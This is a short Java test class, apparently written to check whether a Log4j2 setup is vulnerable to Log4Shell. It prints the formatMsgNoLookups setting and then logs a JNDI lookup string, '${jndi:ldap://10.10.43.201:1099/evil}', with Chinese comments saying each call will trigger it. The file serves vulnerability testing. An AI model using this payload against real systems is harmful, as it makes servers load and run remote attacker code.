package cn.zxf.log4j2.test;

public class TestMain {

    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(TestMain.class);

    public static void main(String[] args) {
        log.info("vm-param: [{}]", System.getProperty("log4j2.formatMsgNoLookups"));
        log.info("test info");
        log.warn("test warn");
        log.error("test error");
        System.out.println("cn.zxf.log4j2.test.TestMain".length());
        System.out.println();

        lookup("${jndi:ldap://10.10.43.201:1099/evil}");
    }

    static void lookup(String info) {
        log.info("info: [{}]", info); // 会触发
        log.info(info); // 会触发
    }

}
